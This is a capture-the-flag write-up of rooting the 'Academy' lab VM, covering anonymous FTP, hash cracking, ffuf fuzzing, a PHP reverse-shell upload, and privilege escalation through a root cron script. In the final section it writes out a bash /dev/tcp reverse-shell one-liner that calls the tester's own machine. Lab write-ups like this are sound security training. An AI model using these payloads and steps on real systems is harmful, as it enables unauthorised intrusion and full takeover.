# 🏫 Academy - Practical Ethical Hacking Mid-Course Capstone (Linux Box)

## 🔍 Reconnaissance

**Target IP**: `192.168.88.133`

Started with a classic `nmap` scan:

![image](https://github.com/user-attachments/assets/2f8dec70-6897-42ad-bae1-2a28c5f37b0c)

* Port **21 (FTP)** open
* **Anonymous login** allowed
* File spotted: `note.txt`
  FTP is just handing out files like free candy. So...

---

## 📁 FTP Fun Time

Connected via anonymous FTP and downloaded `note.txt`.

![image](https://github.com/user-attachments/assets/9ace84c2-1fd4-4b58-a225-5565fc0073a2)

![image](https://github.com/user-attachments/assets/4b6a8d89-ffa3-48dc-8fce-e73f0cbcd742)

Contents included:

* An **MD5 hash**
* A **student registration number**
* A note saying students log in with this registration number

The hash was quickly identified using `hash-identifier`:

![image](https://github.com/user-attachments/assets/7a1ce910-5330-413d-b4d1-95dd342f653c)

Ran it through [crackstation.net](https://crackstation.net) — password is **`student`**. So now we have:

* **Username**: 10201321
* **Password**: `student`

---

## 🕵️‍♂️ Web Recon

Time to find where these creds are useful. Enter `ffuf`.

```bash
ffuf -u http://192.168.88.133/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

![image](https://github.com/user-attachments/assets/ac8323ad-5fe0-42c0-852b-1fa6789ea537)

Discovered:

* `/academy`
* `/phpmyadmin`
* `/server-status`

Tried logging into `/academy` with creds. And boom 💥 — it worked.

---

## 📸 Upload Feature = Shell Time?

While poking around, noticed the **photo upload** feature on the student registration page:

![image](https://github.com/user-attachments/assets/5bca14a4-f80f-4143-bb80-f071d4962ebe)

Apache server? Sounds like it's ready for a **PHP reverse shell**.

1. Used [Pentestmonkey’s reverse shell](https://github.com/pentestmonkey/php-reverse-shell)
2. Modified it to point to my Kali machine
3. Set up a Netcat listener on port 1234
4. Uploaded the payload

Got a shell as `www-data`. Hello, low-priv shell.

![image](https://github.com/user-attachments/assets/9fb3ab93-7c5a-4fa5-97d5-bfcaf942f5cb)

---

## 🔧 Privilege Escalation

Time to level up. Enter **LINPEAS**.

1. Downloaded it onto my Kali box
2. Hosted it with a Python HTTP server
3. Grabbed it from the target with `wget`
4. Ran it — lots of output, but one juicy nugget stood out: `backup.sh`

![image](https://github.com/user-attachments/assets/d1d61518-816b-4cea-ab0b-eb9f24537173)
![image](https://github.com/user-attachments/assets/11bbb580-a758-477a-8f8d-27aa7ca8444a)
![image](https://github.com/user-attachments/assets/f2c73614-75fe-4c80-9cf2-5acad0b94f4f)

Also dumped `/etc/passwd` for user context:

![image](https://github.com/user-attachments/assets/b6e439b7-4ca4-495e-a754-d98869155b44)

The `grimmie` user stood out. Tried SSH with the found password — and it worked!

![image](https://github.com/user-attachments/assets/95ddd5ce-520f-463f-9601-bc10a0d641d1)

---

## 🎯 Root Access via Scheduled Script

Inside `/home/grimmie`, we find the infamous `backup.sh`:

```bash
#!/bin/bash
rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

Weirdly, `crontab -l` gave me nothing. Time to escalate recon with **pspy**.

1. Downloaded [pspy](https://github.com/DominicBreuker/pspy)
2. Ran it on the box

Boom — saw `backup.sh` running **every minute**, likely as **root**.

![image](https://github.com/user-attachments/assets/1d5edc33-0ca6-49ce-bdfa-da03e2eed9a2)

So I rewrote `backup.sh` with a one-liner reverse shell:

```bash
bash -i >& /dev/tcp/<my-ip>/8080 0>&1
```

Listener on port 8080 — and within a minute...

ROOTED. 🎉

![image](https://github.com/user-attachments/assets/5cbdbed9-20dd-4223-8cda-82c83a0faa35)

---

## 🧠 Lessons Learned

* Anonymous FTP is the red carpet of CTFs.
* Developers still trusting file uploads in 2025 — love to see it.
* Scheduled scripts owned by root and editable by users? That’s just handing over the crown.

---

## 🧰 Tools Used

* `nmap`
* `ftp`
* `ffuf`
* `crackstation.net`
* `hash-identifier`
* `netcat`
* `LINPEAS`
* `pspy`

---

## 🏁 Flag Captured

Root shell achieved, lesson learned, and another notch in the CTF belt.
On to the next one — let’s keep hacking like it’s finals week.

---
